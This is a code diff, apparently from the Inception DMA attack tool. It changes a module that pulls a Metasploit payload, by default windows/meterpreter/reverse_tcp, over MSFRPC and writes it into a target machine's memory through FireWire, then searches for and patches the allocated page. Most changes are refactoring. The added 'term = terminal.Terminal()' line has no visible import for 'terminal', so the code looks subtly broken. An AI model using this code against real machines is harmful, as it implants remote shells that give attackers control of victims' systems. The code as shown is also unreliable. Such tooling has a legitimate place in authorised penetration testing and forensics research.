@@ -21,18 +21,19 @@ Created on Dec 5, 2013
 
 @author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
 '''
-from inception import firewire, cfg, util
-#from inception.screenlock import list_targets, select_target, searchanddestroy, patch
-from inception.memory import Target, Signature, Chunk, MemorySpace
-from inception.external.pymetasploit.metasploit.msfrpc import MsfRpcClient, MsfRpcError, PayloadModule
-from inception.external.pymetasploit.metasploit.msfconsole import MsfRpcConsole
-
-import collections
-import optparse
-import time
 import os
+import time
+
+from inception import firewire, cfg, util
+from inception.external.pymetasploit.metasploit.msfconsole import MsfRpcConsole
+from inception.external.pymetasploit.metasploit.msfrpc import MsfRpcClient, MsfRpcError, PayloadModule
+from inception.memory import Target, Signature, Chunk, MemorySpace
+from inception.exceptions import InceptionException
+
 
 IS_INTRUSIVE = True
+
+term = terminal.Terminal()
 
 info = 'This module implants a (potentially memory-only) Metasploit ' \
 'payload directly to the volatile memory of the target machine.'
@@ -54,23 +55,23 @@ info = 'This module implants a (potentially memory-only) Metasploit ' \
 
 # kernel32.dll!SetUnhandledExceptionFilter (0xEA320EFE) - This exit function
 # will let the UnhandledExceptionFilter function perform its default handling
-# routine. 
+# routine.
 
-# kernel32.dll!ExitProcess (0x56A2B5F0) - This exit function will force the 
+# kernel32.dll!ExitProcess (0x56A2B5F0) - This exit function will force the
 # process to terminate.
 
-# kernel32.dll!ExitThread (0x0A2A1DE0) - This exit function will force the 
+# kernel32.dll!ExitThread (0x0A2A1DE0) - This exit function will force the
 # current thread to terminate. On Windows 2008, Vista and 7 this function is
-# a forwarded export to ntdll.dll!RtlExitUserThread and as such cannot be 
+# a forwarded export to ntdll.dll!RtlExitUserThread and as such cannot be
 # called by the api_call function.
 
-# ntdll.dll!RtlExitUserThread (0x6F721347) - This exit function will force 
-# the current thread to terminate. This function is not available on Windows 
+# ntdll.dll!RtlExitUserThread (0x6F721347) - This exit function will force
+# the current thread to terminate. This function is not available on Windows
 # NT or 2000.
-SEH = 0xea320efe        # kernel32.dll!SetUnhandledExceptionFilter
-PROCESS = 0x56a2b5f0    # kernel32.dll!ExitProcess
-THREAD = 0x0a2a1de0     # kernel32.dll!ExitThread
-USERTHREAD = 0x6f721347 # ntdll.dll!RtlExitUserThread
+SEH = 0xea320efe         # kernel32.dll!SetUnhandledExceptionFilter
+PROCESS = 0x56a2b5f0     # kernel32.dll!ExitProcess
+THREAD = 0x0a2a1de0      # kernel32.dll!ExitThread
+USERTHREAD = 0x6f721347  # ntdll.dll!RtlExitUserThread
 
 stages = {
     'alloc_page': 
@@ -123,7 +124,8 @@ stage1 = Target(
             version='',
             md5='',
             tag=False)
-        ])
+        ]
+    )
 
 # stage2 = {
 # 'x86': Target(
@@ -150,12 +152,15 @@ stage1 = Target(
 #         ]),
 # 'x64': None}
 
+
 def add_options(group):
-    group.add_option('--msfopts', dest='msfopts',
-        help='exploit options in a comma-separated list using the format ' \
-        '\'OPTION=value\'')
-    group.add_option('--msfpw', dest='msfpw',
-        help='password for the MSFRPC daemon')
+    group.add_option('--msfopts',
+                     dest='msfopts',
+                     help='exploit options in a comma-separated list using '
+                          'the format \'OPTION=value\'')
+    group.add_option('--msfpw',
+                     dest='msfpw',
+                     help='password for the MSFRPC daemon')
 
 
 def str2dict(str):
@@ -179,7 +184,7 @@ def set_exitfunc(payload, exitfunk):
     '''
     Sets the exitfunc of a payload by manipulating the binary string
     '''
-    pass # TODO
+    pass  # TODO
 
 
 def run(opts, memspace):
@@ -188,18 +193,19 @@ def run(opts, memspace):
     try:
         client = MsfRpcClient(opts.msfpw)
     except MsfRpcError as e:
-        term.fail(e)
+        raise InceptionException('Could not connect to Metasploit: {0}'
+                                 .format(e))
 
     name = term.poll('What MSF payload do you want to use?',
-        default='windows/meterpreter/reverse_tcp')
+                     default='windows/meterpreter/reverse_tcp')
     try:
         module = PayloadModule(client, name)
         set_opts(module, opts.msfopts)
-        payload = module.execute(Encoder='generic/none').get('payload') # **{'-t': 'raw'}
+        payload = module.execute(Encoder='generic/none').get('payload')
     except MsfRpcError as e:
-        term.fail(e)
+        raise InceptionException('Could not get Metasploit payload: {0}'
+                                 .format(e))
 
-    
     # term.poll('Options:')
     # options = {'LHOST': 'localhost'}
     #module['LHOST'] = '192.168.0.8'
@@ -240,7 +246,7 @@ def run(opts, memspace):
 
     # Write back original, backed up page
     success = memspace.memory.write(address, backup)
-    # Search for the signature
+    # Search for the newly allocated page with our signature
     address, signature, offset, chunks = memspace.rawfind(0, 0xffe0000000000000).pop()
     # Signature found, let's patch
     page = memspace.page_no(address)
